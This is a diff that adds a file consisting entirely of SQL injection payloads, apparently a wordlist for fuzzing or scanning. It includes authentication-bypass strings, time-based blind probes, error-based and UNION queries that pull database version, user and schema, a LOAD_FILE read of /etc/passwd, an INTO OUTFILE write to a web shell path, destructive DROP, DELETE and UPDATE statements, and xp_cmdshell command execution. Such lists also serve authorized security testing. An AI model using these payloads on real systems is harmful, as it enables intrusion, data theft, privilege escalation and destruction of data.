@@ -1,0 +1,170 @@
+'
+"
+`
+')
+'))
+'))--
+"-- 
+' OR '1'='1
+' OR '1'='2
+' OR 1=1--
+' OR 1=2--
+" OR "1"="1
+" OR "1"="2
+admin'--
+admin'#
+admin'/*
+' OR 'x'='x
+' AND 'x'='x
+' AND 1=1--
+' AND 1=2--
+1' AND SLEEP(3)--
+1' AND SLEEP(3)#
+1) AND SLEEP(3)--
+1)) AND SLEEP(3)--
+1 AND SLEEP(3)
+1; WAITFOR DELAY '0:0:3'--
+1'; WAITFOR DELAY '0:0:3'--
+1' AND (SELECT 1 FROM (SELECT SLEEP(3))x)--
+1' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1 UNION SELECT NULL--
+1 UNION SELECT 1,2,3--
+' UNION SELECT @@version--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION SELECT table_name FROM information_schema.tables--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,user()),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' OR pg_sleep(3)--
+'; SELECT pg_sleep(3)--
+' AND 1=(SELECT 1 FROM PG_SLEEP(3))--
+1' AND 1=1 LIMIT 1--
+1' ORDER BY 1--
+1' ORDER BY 100--
+1' GROUP BY 1--
+1' HAVING 1=1--
+'||(SELECT 1)||'
+'+(SELECT 1)+'
+' AND '1'='1
+') AND ('1'='1
+'; EXEC xp_cmdshell 'ping -n 3 127.0.0.1'--
+1' AND 1=1#
+1' AND 1=2#
+1' AND '1'='1'#
+1' AND '1'='2'#
+1' OR '1'='1'#
+1' OR '1'='2'#
+1' OR 1=1 LIMIT 1#
+1' OR 1=1 ORDER BY 1#
+1' ORDER BY 1,2,3--
+1' ORDER BY 1,2,3,4,5,6,7,8,9,10--
+1' GROUP BY 1--
+1' HAVING 1=1--
+1' PROCEDURE ANALYSE()--
+1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+1' AND (SELECT COUNT(*) FROM users)>0--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' AND EXISTS(SELECT * FROM users)--
+1' AND NOT EXISTS(SELECT * FROM nonexistent_table_xyz)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1 OR 1=2
+1 AND (SELECT 1)=(SELECT 1)
+1 AND (SELECT 1)=(SELECT 2)
+1 AND SUBSTRING('abc',1,1)='a'
+1 AND SUBSTRING('abc',1,1)='b'
+1 AND 1 LIKE 1
+1 AND 1 LIKE 2
+1 AND 1 BETWEEN 1 AND 2
+1 AND 1 IN (1)
+1 AND 1 IN (2)
+1 AND 1 REGEXP '1'
+1 AND 1 REGEXP '2'
+1 AND 1 RLIKE '1'
+1 AND CONCAT('a','b')='ab'
+1 AND CONCAT('a','b')='ba'
+1 AND LENGTH('abc')=3
+1 AND LENGTH('abc')=4
+1 AND UPPER('a')='A'
+1 AND LOWER('A')='a'
+1 AND HEX(0x41)='41'
+1 AND UNHEX('41')='A'
+1 AND MD5('a')=MD5('a')
+1 AND SHA1('a')=SHA1('a')
+1 AND ASCII('A')=65
+1 AND CHAR(65)='A'
+1 AND VERSION() LIKE '%'
+1 AND DATABASE() LIKE '%'
+1 AND USER() LIKE '%'
+1 AND CURRENT_USER() LIKE '%'
+1 AND SYSTEM_USER() LIKE '%'
+1 AND SESSION_USER() LIKE '%'
+1 AND @@VERSION LIKE '%'
+1 AND @@DATADIR LIKE '%'
+1 AND @@HOSTNAME LIKE '%'
+1 AND @@BASEDIR LIKE '%'
+1' UNION ALL SELECT NULL--
+1' UNION ALL SELECT 1--
+1' UNION ALL SELECT 1,2--
+1' UNION ALL SELECT 1,2,3--
+1' UNION ALL SELECT 1,2,3,4--
+1' UNION ALL SELECT 1,2,3,4,5--
+1' UNION ALL SELECT 1,2,3,4,5,6--
+1' UNION ALL SELECT 1,2,3,4,5,6,7--
+1' UNION ALL SELECT 1,2,3,4,5,6,7,8--
+1' UNION ALL SELECT 1,2,3,4,5,6,7,8,9--
+1' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--
+1' UNION SELECT table_name,NULL FROM information_schema.tables--
+1' UNION SELECT column_name,NULL FROM information_schema.columns--
+1' UNION SELECT table_schema,NULL FROM information_schema.tables--
+1' UNION SELECT user(),NULL--
+1' UNION SELECT version(),NULL--
+1' UNION SELECT @@version,NULL--
+1' UNION SELECT database(),NULL--
+1' UNION SELECT current_user(),NULL--
+1' UNION SELECT CONCAT(user(),':',database()),NULL--
+1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
+1' UNION SELECT NULL,NULL,NULL INTO OUTFILE '/var/www/shell.php'--
+1'; DROP TABLE users--
+1'; DELETE FROM users--
+1'; UPDATE users SET admin=1--
+1'; INSERT INTO users VALUES('x','x')--
+1'; EXEC sp_configure 'show advanced options',1--
+1'; EXEC xp_cmdshell 'whoami'--
+1' AND 1=CONVERT(int,(SELECT @@version))--
+1' AND 1=CONVERT(int,(SELECT database()))--
+1' AND CAST('1' AS int)=1--
+1' AND 1=(SELECT 1)--
+0x27 OR 0x31=0x31--
+' OR '1'='1' /*
+' OR '1'='1' --
+' OR '1'='1' #
+') OR ('1'='1'--
+') OR ('1'='1'/*
+' OR 1=1 /*
+' OR 1=1;--
+' OR 'a'='a
+' OR 'a'='a'--
+" OR "a"="a
+" OR "a"="a"--
+') OR ('a'='a
+') OR ('a'='a')--
+'||'1'='1
+"||"1"="1
+'||(SELECT 1)||'
+1'||'1'='1
+' AND '1'='1' /*
+' AND '1'='1' --
+1') AND ('1'='1
+1') AND ('1'='1')--
+1')) AND (('1'='1
+1')) AND (('1'='1')--
